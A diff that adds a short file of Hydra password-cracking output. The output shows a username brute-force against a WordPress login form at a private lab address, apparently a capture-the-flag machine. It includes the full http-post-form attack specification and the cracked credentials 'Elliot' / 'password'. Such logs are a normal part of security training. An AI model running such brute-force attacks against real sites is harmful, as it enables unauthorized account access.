@@ -1,0 +1,6 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-24 21:33:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
+[DATA] attacking http-post-form://192.168.229.162:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.229.162%2Fwp-admin%2F&testcookie=1:Invalid username
+[80][http-post-form] host: 192.168.229.162   login: Elliot   password: password
